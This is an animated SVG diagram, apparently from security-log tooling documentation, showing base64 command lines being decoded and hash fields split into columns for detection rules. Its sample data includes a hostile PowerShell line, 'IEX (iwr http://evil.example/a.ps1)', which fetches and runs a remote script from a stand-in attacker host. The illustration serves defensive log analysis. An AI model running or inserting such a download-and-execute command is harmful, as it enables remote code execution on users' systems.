@@ -1,0 +1,152 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 356" width="960" height="356" role="img" aria-labelledby="t d">
+  <title id="t">Transforms, then field splitting</title>
+  <desc id="d">First a sandboxed Python transform decodes the base64 in CommandLine into a new field, CommandLine_b64decoded. Then the Hashes value SHA1=…,MD5=…,SHA256=… is split on commas and equals signs into SHA1, MD5 and SHA256 columns, so rules can match the decoded command and each hash directly.</desc>
+  <style>
+    :root {
+      --paper: #eef1ef;
+      --panel: #f8faf8;
+      --ink: #16211e;
+      --ink-2: #4a5955;
+      --rule: #cfd8d4;
+      --signal: #00697a;
+      --strip: #7c8b87;
+      --danger: #a3134e;
+      --signal-tint: rgb(0 105 122 / 0.1);
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --paper: #0e191c;
+        --panel: #13232a;
+        --ink: #e2ebe8;
+        --ink-2: #9daea9;
+        --rule: #26393f;
+        --signal: #53c2cf;
+        --strip: #5f7570;
+        --danger: #f2568e;
+        --signal-tint: rgb(83 194 207 / 0.14);
+      }
+    }
+    text { fill: var(--ink); font: 13px ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
+    .mono, .mono text { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    .card { fill: var(--paper); stroke: var(--rule); }
+    .panel { fill: var(--panel); stroke: var(--rule); }
+    .ink2 { fill: var(--ink-2); }
+    .bold { font-weight: 600; }
+    .step { font-weight: 600; }
+    .step .n { fill: var(--signal); }
+    .step .ink2 { font-weight: 400; }
+    .arrow { fill: none; stroke: var(--strip); stroke-width: 1.5; }
+    .head { fill: var(--strip); }
+    .field { fill: var(--signal); font-weight: 600; }
+    .sandbox { fill: var(--panel); stroke: var(--strip); stroke-dasharray: 5 4; }
+    .line { stroke: var(--rule); }
+    .new { fill: var(--signal-tint); }
+    .old { fill: var(--ink-2); }
+    .cut { fill: var(--danger); font-weight: 700; }
+    .key { fill: var(--signal); font-weight: 600; }
+
+    .scene, .an, .cut, .key { animation: 11s ease-in-out infinite; }
+    .scene { animation-name: scene; }
+    .cut { animation-name: cut; }
+    .key { animation-name: key; }
+    .in1 { animation-name: in1; }
+    .box1 { animation-name: box1; }
+    .out1 { animation-name: out1; }
+    .in2 { animation-name: in2; }
+    .box2 { animation-name: box2; }
+    .cell1 { animation-name: cell1; }
+    .cell2 { animation-name: cell2; }
+    .cell3 { animation-name: cell3; }
+    .table { animation-name: table; }
+    .newcols { animation-name: newcols; }
+
+    @keyframes in1 { 0%, 2.73% { opacity: 0; transform: translateX(-10px); } 6.82%, 100% { opacity: 1; transform: none; } }
+    @keyframes box1 { 0%, 9.09% { opacity: 0; transform: translateX(-8px); } 13.18%, 100% { opacity: 1; transform: none; } }
+    @keyframes out1 { 0%, 17.27% { opacity: 0; transform: translateX(-10px); } 21.36%, 100% { opacity: 1; transform: none; } }
+    @keyframes in2 { 0%, 27.27% { opacity: 0; transform: translateX(-10px); } 31.36%, 100% { opacity: 1; transform: none; } }
+    @keyframes box2 { 0%, 37.27% { opacity: 0; transform: translateX(-8px); } 41.36%, 100% { opacity: 1; transform: none; } }
+    @keyframes cell1 { 0%, 45.45% { opacity: 0; transform: translateX(-8px); } 49.09%, 100% { opacity: 1; transform: none; } }
+    @keyframes cell2 { 0%, 47.73% { opacity: 0; transform: translateX(-8px); } 51.36%, 100% { opacity: 1; transform: none; } }
+    @keyframes cell3 { 0%, 50% { opacity: 0; transform: translateX(-8px); } 53.64%, 100% { opacity: 1; transform: none; } }
+    @keyframes table { 0%, 57.27% { opacity: 0; transform: translateY(6px); } 61.36%, 100% { opacity: 1; transform: none; } }
+    @keyframes newcols { 0%, 63.64% { opacity: 0; } 68.18%, 100% { opacity: 1; } }
+    @keyframes cut { 0%, 32.73% { fill: var(--ink); } 36.36%, 100% { fill: var(--danger); } }
+    @keyframes key { 0%, 32.73% { fill: var(--ink); } 36.36%, 100% { fill: var(--signal); } }
+    @keyframes scene { 0%, 96.36% { opacity: 1; } 100% { opacity: 0; } }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after { animation: none !important; }
+    }
+  </style>
+
+  <rect class="card" x="0.5" y="0.5" width="959" height="355" rx="14"/>
+
+  <text class="step" x="24" y="34"><tspan class="n">1</tspan>  Transform <tspan class="ink2">runs first, on the raw value</tspan></text>
+  <text class="step" x="24" y="146"><tspan class="n">2</tspan>  Split <tspan class="ink2">turns key=value pairs into columns</tspan></text>
+  <text class="step" x="24" y="258">The row in logs <tspan class="ink2">new columns highlighted, rules match them directly</tspan></text>
+
+  <g class="scene">
+    <!-- 1. a sandboxed Python transform adds an alias field -->
+    <g class="an in1">
+      <rect class="panel" x="24.5" y="46.5" width="304" height="64" rx="6"/>
+      <text class="mono field" x="38" y="70">CommandLine</text>
+      <text class="mono" x="38" y="93">powershell -enc SQBFAFgAIAAoAGkA…</text>
+    </g>
+    <g class="an box1">
+      <path class="arrow" d="M329 78.5h13"/><path class="head" d="M348 78.5l-6-4v8z"/>
+      <rect class="sandbox" x="348.5" y="46.5" width="244" height="64" rx="6"/>
+      <text x="362" y="70"><tspan class="bold">Python transform</tspan> <tspan class="ink2">(sandboxed)</tspan></text>
+      <text class="mono ink2" x="362" y="93">base64.b64decode(…)</text>
+    </g>
+    <g class="an out1">
+      <path class="arrow" d="M593 78.5h13"/><path class="head" d="M612 78.5l-6-4v8z"/>
+      <rect class="panel" x="612.5" y="46.5" width="324" height="64" rx="6"/>
+      <text class="mono field" x="626" y="70">CommandLine_b64decoded</text>
+      <text class="mono" x="626" y="93">IEX (iwr http://evil.example/a.ps1)</text>
+    </g>
+
+    <!-- 2. Hashes splits on "," then "=" -->
+    <g class="an in2">
+      <rect class="panel" x="24.5" y="158.5" width="304" height="64" rx="6"/>
+      <text class="mono field" x="38" y="182">Hashes</text>
+      <text class="mono" x="38" y="205"><tspan class="key">SHA1</tspan><tspan class="cut">=</tspan>3a5b…<tspan class="cut">,</tspan><tspan class="key">MD5</tspan><tspan class="cut">=</tspan>9f1c…<tspan class="cut">,</tspan><tspan class="key">SHA256</tspan><tspan class="cut">=</tspan>e7d2…</text>
+    </g>
+    <g class="an box2">
+      <path class="arrow" d="M329 190.5h13"/><path class="head" d="M348 190.5l-6-4v8z"/>
+      <rect class="panel" x="348.5" y="158.5" width="244" height="64" rx="6"/>
+      <text class="bold" x="362" y="182">split</text>
+      <text class="mono ink2" x="362" y="205">separator "," equal "="</text>
+    </g>
+    <path class="arrow an cell1" d="M593 190.5h13"/><path class="head an cell1" d="M612 190.5l-6-4v8z"/>
+    <rect class="panel an cell1" x="612.5" y="158.5" width="324" height="64" rx="6"/>
+    <g class="mono">
+      <g class="an cell1"><text class="field" x="626" y="182">SHA1</text><text x="626" y="205">3a5b…</text></g>
+      <g class="an cell2"><path class="line" d="M720.5 159v63"/><text class="field" x="734" y="182">MD5</text><text x="734" y="205">9f1c…</text></g>
+      <g class="an cell3"><path class="line" d="M828.5 159v63"/><text class="field" x="842" y="182">SHA256</text><text x="842" y="205">e7d2…</text></g>
+    </g>
+
+    <!-- result: one logs row carrying the original and the derived fields -->
+    <g class="an table">
+      <rect class="panel" x="24.5" y="270.5" width="912" height="62" rx="6"/>
+      <g class="an newcols">
+        <rect class="new" x="181" y="271" width="219" height="61"/>
+        <path class="new" d="M557 271h373.5a5.5 5.5 0 0 1 5.5 5.5v50a5.5 5.5 0 0 1-5.5 5.5h-373.5z"/>
+      </g>
+      <path class="line" d="M25 300.5h911M180.5 271v61M400.5 271v61M556.5 271v61M682.5 271v61M808.5 271v61"/>
+      <g class="mono">
+        <text class="old" x="36" y="291">CommandLine</text>
+        <text class="field" x="192" y="291">CommandLine_b64decoded</text>
+        <text class="old" x="412" y="291">Hashes</text>
+        <text class="field" x="568" y="291">SHA1</text>
+        <text class="field" x="694" y="291">MD5</text>
+        <text class="field" x="820" y="291">SHA256</text>
+        <text class="old" x="36" y="321">powershell -enc…</text>
+        <text x="192" y="321">IEX (iwr http://evi…</text>
+        <text class="old" x="412" y="321">SHA1=3a5b…,MD5…</text>
+        <text x="568" y="321">3a5b…</text>
+        <text x="694" y="321">9f1c…</text>
+        <text x="820" y="321">e7d2…</text>
+      </g>
+    </g>
+  </g>
+</svg>
